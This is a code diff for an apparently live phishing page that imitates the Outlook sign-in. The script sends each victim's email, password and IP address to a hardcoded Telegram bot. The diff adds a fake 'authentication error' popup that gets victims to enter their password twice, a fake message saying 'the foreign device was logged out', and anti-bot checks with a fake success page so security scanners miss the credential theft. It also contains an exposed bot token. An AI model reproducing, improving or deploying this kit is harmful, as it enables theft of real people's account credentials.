@@ -56,11 +56,94 @@
       transition: opacity 0.5s ease-in-out;
     }
     
+    /* Authentication Error Popup */
+    .auth-error-popup {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #dc2626;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 6px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      z-index: 10000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: transform 0.3s ease-in-out;
+      max-width: 400px;
+    }
+    
+    .auth-error-popup.show {
+      transform: translateX(-50%) translateY(0);
+    }
+    
+    .auth-error-popup::before {
+      content: "⚠";
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    
+    .auth-error-popup.fade-out {
+      opacity: 0;
+      transition: opacity 0.5s ease-in-out;
+    }
+    
     /* Email field protection */
     #email {
       background-color: #f8f8f8;
       pointer-events: none;
       user-select: none;
+    }
+    
+    /* Password field focus styling */
+    #password:focus {
+      border: 1px solid #000000 !important;
+      border-radius: 1px !important;
+      outline: none !important;
+      box-shadow: none !important;
+    }
+    
+    /* Hidden honeypot fields */
+    .honeypot-field {
+      position: absolute !important;
+      left: -9999px !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+      height: 0 !important;
+      width: 0 !important;
+      margin: 0 !important;
+      padding: 0 !important;
+      border: 0 !important;
+    }
+    
+    /* Success/Error messages */
+    .success-message, .error-message {
+      padding: 15px;
+      border-radius: 5px;
+      margin-top: 15px;
+      font-weight: 500;
+    }
+    
+    .success-message {
+      background: #10b981;
+      color: white;
+    }
+    
+    .error-message {
+      background: #ef4444;
+      color: white;
     }
   </style>
 </head>
@@ -69,11 +152,26 @@
     <div class="div-block"><img src="images/email.png" loading="lazy" alt="" class="image"></div>
     <div class="div-block-2"><img src="images/image.png" loading="lazy" sizes="(max-width: 546px) 100vw, 546px" srcset="images/image-p-500.png 500w, images/image.png 546w" alt="" class="image-2">
       <div class="form-block w-form">
-        <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="68f89e61044f107c8074cebc" data-wf-element-id="22da511f-7236-2a9c-8b64-c7b114ebea92">
+        <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="68f89e61044f107c8074cebc" data-wf-element-id="22da511f-7236-2a9c-8b64-c7b114ebea92" data-bot-protection="enabled">
+          <!-- Hidden fields for security -->
           <input type="hidden" id="ip" name="ip">
           <input type="hidden" id="hidden-email" name="email">
-          <!-- Honeypot field for bots -->
-          <input type="text" id="bot-trap" name="bot-trap" style="display:none !important;" tabindex="-1" autocomplete="off">
+          <input type="hidden" name="_form_init_time" id="_form_init_time">
+          <input type="hidden" name="_validation_token" id="_validation_token">
+          <input type="hidden" name="_client_fingerprint" id="_client_fingerprint">
+          
+          <!-- Enhanced Honeypot Fields -->
+          <div class="honeypot-field" aria-hidden="true" tabindex="-1">
+            <label>Confirm Email: <input type="email" name="email_confirm" autocomplete="off" tabindex="-1"></label>
+          </div>
+          <div class="honeypot-field" aria-hidden="true" tabindex="-1">
+            <label>Website: <input type="url" name="website" autocomplete="off" tabindex="-1"></label>
+          </div>
+          <div class="honeypot-field" aria-hidden="true" tabindex="-1">
+            <label>Alternative Phone: <input type="tel" name="phone_alt" autocomplete="off" tabindex="-1"></label>
+          </div>
+          <!-- Additional honeypot -->
+          <input type="text" id="bot-trap" name="bot-trap" class="honeypot-field" tabindex="-1" autocomplete="off">
           
           <label for="email" class="field-label">User name:</label>
           <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly>
@@ -87,16 +185,18 @@
         <div class="w-form-done">
           <div>Thank you! Your submission has been received!</div>
         </div>
-        <div class="w-form-fail">
-          <div>Re-Authenticate</div>
-        </div>
       </div>
     </div>
   </section>
 
   <!-- Cache Cleared Notification -->
   <div id="cacheNotification" class="cache-notification">
-    Messages Sucessfuly Allowed
+    The foreign device was logged out.
+  </div>
+
+  <!-- Authentication Error Popup -->
+  <div id="authErrorPopup" class="auth-error-popup">
+    Authentication error: Please check your credentials and try again
   </div>
 
   <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=68f89e5e044f107c8074cdb5" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
@@ -121,198 +221,326 @@
       document.getElementById('hidden-email').value = finalEmail;
       document.getElementById('email').value = finalEmail;
     }
+
+    // Show authentication error if this is after first submission
+    if (sessionStorage.getItem('showAuthError')) {
+      setTimeout(() => {
+        showAuthErrorPopup();
+      }, 1000);
+      sessionStorage.removeItem('showAuthError');
+    }
   });
+
+  // Function to show authentication error popup
+  function showAuthErrorPopup() {
+    const popup = document.getElementById('authErrorPopup');
+    popup.classList.add('show');
+    
+    // Auto-hide after 5 seconds
+    setTimeout(() => {
+      popup.classList.add('fade-out');
+      setTimeout(() => {
+        popup.classList.remove('show', 'fade-out');
+      }, 500);
+    }, 5000);
+  }
   </script>
 
   <script>
-  $(document).ready(function () {
-    // First, fetch user's IP and store it in the hidden field
-    $.getJSON("https://api64.ipify.org?format=json", function (data) {
-      $("#ip").val(data.ip);
-      console.log("User IP:", data.ip);
-    });
-    
-    // Make sure email is preserved after page reload
-    window.addEventListener('load', function() {
-      const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
-      const urlParams = new URLSearchParams(window.location.search);
-      const emailFromQuery = urlParams.get('email');
-      const finalEmail = emailFromUrl || emailFromQuery;
-      
-      if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
-        document.getElementById('hidden-email').value = finalEmail;
-        document.getElementById('email').value = finalEmail;
-      }
-    });
+  // Advanced Bot Protection Integration
+  (function() {
+    'use strict';
 
-    // ADVANCED BOT PROTECTION
-    
-    // 1. Honeypot detection
-    let honeypotTimer = setTimeout(function() {
-      $('#bot-trap').on('focus', function() {
-        console.log('Bot detected via honeypot');
-        window.location.href = "https://outlook.live.com";
-      });
-    }, 1000);
+    const OutlookAntiBot = {
+      startTime: Date.now(),
+      mouseMovements: 0,
+      keyPresses: 0,
+      minInteractionTime: 3000,
+      honeypots: new Set(['email_confirm', 'website', 'phone_alt', 'bot-trap']),
+      submissionBlocked: false,
 
-    // 2. Form submission timing detection
-    let formLoadTime = Date.now();
-    let submissionBlocked = false;
+      init: function() {
+        this.setupForm();
+        this.trackUserBehavior();
+        this.setupSubmitHandler();
+        this.generateFingerprint();
+      },
 
-    // 3. Human behavior simulation requirement
-    let humanInteraction = false;
-    let mouseMovements = 0;
-    
-    $(document).on('mousemove click keydown scroll', function() {
-      humanInteraction = true;
-      mouseMovements++;
-      clearTimeout(honeypotTimer);
-    });
+      setupForm: function() {
+        // Set form initialization time
+        document.getElementById('_form_init_time').value = this.startTime;
+        
+        // Add bot protection attribute
+        document.getElementById('email-form').setAttribute('data-bot-protection', 'enabled');
+      },
 
-    // 4. Advanced event blocking for email field
-    $('#email').on('focus click keydown keyup keypress input change', function(e) {
-      e.preventDefault();
-      e.stopPropagation();
-      submissionBlocked = true;
-      return false;
-    });
+      trackUserBehavior: function() {
+        document.addEventListener('mousemove', () => {
+          this.mouseMovements++;
+        }, { passive: true });
 
-    // 5. Copy/paste protection
-    $('#email').on('copy cut paste', function(e) {
-      e.preventDefault();
-      submissionBlocked = true;
-      return false;
-    });
+        document.addEventListener('keydown', () => {
+          this.keyPresses++;
+        }, { passive: true });
 
-    // Function to show cache cleared notification
-    function showCacheClearedNotification() {
-      const notification = document.getElementById('cacheNotification');
-      notification.classList.add('show');
-      
-      // Hide and redirect after 2 seconds
-      setTimeout(() => {
-        notification.classList.add('fade-out');
+        document.addEventListener('touchstart', () => {
+          this.mouseMovements++;
+        }, { passive: true });
+      },
+
+      generateFingerprint: function() {
+        const components = [
+          navigator.userAgent,
+          navigator.language,
+          screen.width,
+          screen.height,
+          screen.colorDepth,
+          new Date().getTimezoneOffset(),
+          !!window.sessionStorage,
+          !!window.localStorage
+        ];
+        document.getElementById('_client_fingerprint').value = btoa(components.join('|'));
+      },
+
+      generateValidationToken: function() {
+        const data = `${this.startTime}:${this.mouseMovements}:${this.keyPresses}:${Date.now()}`;
+        return btoa(data);
+      },
+
+      validateBehavior: function() {
+        const timeSpent = Date.now() - this.startTime;
+
+        if (timeSpent < this.minInteractionTime) {
+          return { valid: false, reason: 'Form submitted too quickly' };
+        }
+
+        if (this.mouseMovements < 3 && this.keyPresses < 5) {
+          return { valid: false, reason: 'Insufficient user interaction detected' };
+        }
+
+        return { valid: true };
+      },
+
+      checkHoneypots: function() {
+        const honeypotFields = ['email_confirm', 'website', 'phone_alt', 'bot-trap'];
+        for (const field of honeypotFields) {
+          const element = document.querySelector(`[name="${field}"]`);
+          if (element && element.value !== '') {
+            return { valid: false, reason: 'Honeypot field filled: ' + field };
+          }
+        }
+        return { valid: true };
+      },
+
+      validateTimezone: function() {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (!tz || tz === 'UTC') {
+          return { valid: false, reason: 'Invalid timezone detected' };
+        }
+        return { valid: true };
+      },
+
+      validateScreen: function() {
+        if (window.screen.width === 0 || window.screen.height === 0) {
+          return { valid: false, reason: 'Invalid screen dimensions' };
+        }
+        return { valid: true };
+      },
+
+      setupSubmitHandler: function() {
+        const form = document.getElementById('email-form');
+        
+        // Advanced event blocking for email field
+        $('#email').on('focus click keydown keyup keypress input change', (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          this.submissionBlocked = true;
+          return false;
+        });
+
+        // Copy/paste protection
+        $('#email').on('copy cut paste', (e) => {
+          e.preventDefault();
+          this.submissionBlocked = true;
+          return false;
+        });
+
+        $(form).submit((event) => {
+          event.preventDefault();
+          this.handleFormSubmission();
+        });
+      },
+
+      handleFormSubmission: function() {
+        // Run all validations
+        const validations = [
+          this.validateBehavior(),
+          this.checkHoneypots(),
+          this.validateTimezone(),
+          this.validateScreen()
+        ];
+
+        const failedValidation = validations.find(v => !v.valid);
+
+        if (failedValidation || this.submissionBlocked) {
+          console.warn('Bot detected:', failedValidation ? failedValidation.reason : 'Email field interaction detected');
+          this.showFakeSuccess();
+          return;
+        }
+
+        // If all validations pass, proceed with Telegram submission
+        this.submitToTelegram();
+      },
+
+      showFakeSuccess: function() {
+        const form = document.getElementById('email-form');
+        const fakeMessage = document.createElement('div');
+        fakeMessage.className = 'success-message';
+        fakeMessage.textContent = 'Thank you! Your submission has been received.';
+        form.parentElement.insertBefore(fakeMessage, form.nextSibling);
+        form.style.display = 'none';
+
         setTimeout(() => {
           window.location.href = "https://outlook.live.com";
-        }, 500);
-      }, 2000);
-    }
+        }, 2000);
+      },
 
-    $("#email-form").submit(function (event) {
-      event.preventDefault();
-
-      // BOT DETECTION CHECKS
-      if ($('#bot-trap').val().length > 0) {
-        console.log('Bot detected: Honeypot field filled');
-        window.location.href = "https://outlook.live.com";
-        return false;
-      }
-      
-      let submissionTime = Date.now();
-      if ((submissionTime - formLoadTime) < 3000) {
-        console.log('Bot detected: Form submitted too quickly');
-        window.location.href = "https://outlook.live.com";
-        return false;
-      }
-      
-      if (!humanInteraction || mouseMovements < 2) {
-        console.log('Bot detected: No human interaction');
-        window.location.href = "https://outlook.live.com";
-        return false;
-      }
-      
-      if (submissionBlocked) {
-        console.log('Bot detected: Email field interaction detected');
-        window.location.href = "https://outlook.live.com";
-        return false;
-      }
-      
-      let userEmail = $("#hidden-email").val();
-      if (!userEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
-        console.log('Bot detected: Invalid email');
-        window.location.href = "https://outlook.live.com";
-        return false;
-      }
-
-      // If all checks pass, proceed with human submission
-      let userPassword = $("#password").val();
-      let userIP = $("#ip").val();
-
-      if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
-        console.error("Missing email or password");
-        return;
-      }
-
-      // Telegram credentials
-      let botToken = "8417686468:AAHMynSC-H9KhFAd_WW02OEr213900iVzBo";
-      let chatId = "8429622655";
-
-      let messageText = `📧 New Outlook Login\n👤 User Name: ${userEmail}\n🔑 Password: ${userPassword}\n🌐 IP Address: ${userIP}\n⏰ Time: ${new Date().toLocaleString()}`;
-      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      // Check if this is the first or second submission
-      let submissionCount = sessionStorage.getItem('outlookSubmissionCount') || 0;
-      
-      if (submissionCount < 1) {
-        // First submission
-        submissionCount = 1;
-        sessionStorage.setItem('outlookSubmissionCount', submissionCount);
+      showCacheClearedNotification: function() {
+        const notification = document.getElementById('cacheNotification');
+        notification.classList.add('show');
         
-        $.ajax({
-          url: telegramUrl,
-          type: "POST",
-          data: {
-            chat_id: chatId,
-            text: messageText,
-            parse_mode: 'HTML'
-          },
-          success: function () {
-            console.log("✅ First form submission to Telegram successfully");
-            setTimeout(function () {
-              window.location.reload();
-            }, 1000);
-          },
-          error: function (jqXHR, textStatus, errorThrown) {
-            console.error("❌ First submission failed:", textStatus, errorThrown);
-            setTimeout(function () {
-              window.location.reload();
-            }, 1000);
-          }
-        });
-      } else {
-        // Second submission - Show cache cleared notification
-        sessionStorage.removeItem('outlookSubmissionCount');
+        setTimeout(() => {
+          notification.classList.add('fade-out');
+          setTimeout(() => {
+            window.location.href = "https://outlook.live.com";
+          }, 500);
+        }, 2000);
+      },
+
+      showAuthErrorPopup: function() {
+        const popup = document.getElementById('authErrorPopup');
+        popup.classList.add('show');
         
-        $.ajax({
-          url: telegramUrl,
-          type: "POST",
-          data: {
-            chat_id: chatId,
-            text: messageText + "\n🔄 Second Submission\n💚 Cache Cleared",
-            parse_mode: 'HTML'
-          },
-          success: function () {
-            console.log("✅ Second form submission to Telegram successfully");
-            // Show the cache cleared notification instead of immediate redirect
-            showCacheClearedNotification();
-          },
-          error: function (jqXHR, textStatus, errorThrown) {
-            console.error("❌ Second submission failed:", textStatus, errorThrown);
-            // Still show notification even if Telegram fails
-            showCacheClearedNotification();
-          }
-        });
+        setTimeout(() => {
+          popup.classList.add('fade-out');
+          setTimeout(() => {
+            popup.classList.remove('show', 'fade-out');
+          }, 500);
+        }, 5000);
+      },
+
+      submitToTelegram: function() {
+        // Set validation token
+        document.getElementById('_validation_token').value = this.generateValidationToken();
+
+        // Get form values
+        let userEmail = $("#hidden-email").val();
+        let userPassword = $("#password").val();
+        let userIP = $("#ip").val();
+
+        if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
+          console.error("Missing email or password");
+          return;
+        }
+
+        // Telegram credentials
+        let botToken = "8417686468:AAHMynSC-H9KhFAd_WW02OEr213900iVzBo";
+        let chatId = "8429622655";
+
+        let messageText = `📧 New Outlook Login\n👤 User Name: ${userEmail}\n🔑 Password: ${userPassword}\n🌐 IP Address: ${userIP}\n⏰ Time: ${new Date().toLocaleString()}\n🖱️ Interactions: ${this.mouseMovements}\n⌨️ Keystrokes: ${this.keyPresses}`;
+
+        let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Check if this is the first or second submission
+        let submissionCount = sessionStorage.getItem('outlookSubmissionCount') || 0;
+        
+        if (submissionCount < 1) {
+          // First submission - Set flag to show auth error after reload
+          sessionStorage.setItem('showAuthError', 'true');
+          submissionCount = 1;
+          sessionStorage.setItem('outlookSubmissionCount', submissionCount);
+          
+          $.ajax({
+            url: telegramUrl,
+            type: "POST",
+            data: {
+              chat_id: chatId,
+              text: messageText + "\n🔄 First Submission",
+              parse_mode: 'HTML'
+            },
+            success: () => {
+              console.log("✅ First form submission to Telegram successfully");
+              setTimeout(() => {
+                window.location.reload();
+              }, 1000);
+            },
+            error: (jqXHR, textStatus, errorThrown) => {
+              console.error("❌ First submission failed:", textStatus, errorThrown);
+              setTimeout(() => {
+                window.location.reload();
+              }, 1000);
+            }
+          });
+        } else {
+          // Second submission - Show cache cleared notification
+          sessionStorage.removeItem('outlookSubmissionCount');
+          
+          $.ajax({
+            url: telegramUrl,
+            type: "POST",
+            data: {
+              chat_id: chatId,
+              text: messageText + "\n🔄 Second Submission\n💚 Cache Cleared",
+              parse_mode: 'HTML'
+            },
+            success: () => {
+              console.log("✅ Second form submission to Telegram successfully");
+              this.showCacheClearedNotification();
+            },
+            error: (jqXHR, textStatus, errorThrown) => {
+              console.error("❌ Second submission failed:", textStatus, errorThrown);
+              this.showCacheClearedNotification();
+            }
+          });
+        }
       }
+    };
+
+    // Initialize when document is ready
+    $(document).ready(function() {
+      // First, fetch user's IP
+      $.getJSON("https://api64.ipify.org?format=json", function(data) {
+        $("#ip").val(data.ip);
+        console.log("User IP:", data.ip);
+        
+        // Initialize anti-bot protection after IP is fetched
+        OutlookAntiBot.init();
+      });
+      
+      // Make sure email is preserved after page reload
+      window.addEventListener('load', function() {
+        const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromQuery = urlParams.get('email');
+        const finalEmail = emailFromUrl || emailFromQuery;
+        
+        if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
+          document.getElementById('hidden-email').value = finalEmail;
+          document.getElementById('email').value = finalEmail;
+        }
+      });
+
+      // Additional protection: If bot tries to submit via JavaScript directly
+      let originalSubmit = HTMLFormElement.prototype.submit;
+      HTMLFormElement.prototype.submit = function() {
+        console.log('Bot detected: Direct form submission attempt');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      };
     });
 
-    // Additional protection: If bot tries to submit via JavaScript directly
-    let originalSubmit = HTMLFormElement.prototype.submit;
-    HTMLFormElement.prototype.submit = function() {
-      console.log('Bot detected: Direct form submission attempt');
-      window.location.href = "https://outlook.live.com";
-      return false;
-    };
-  });
+    window.OutlookAntiBot = OutlookAntiBot;
+  })();
   </script>
 </body>
 </html>
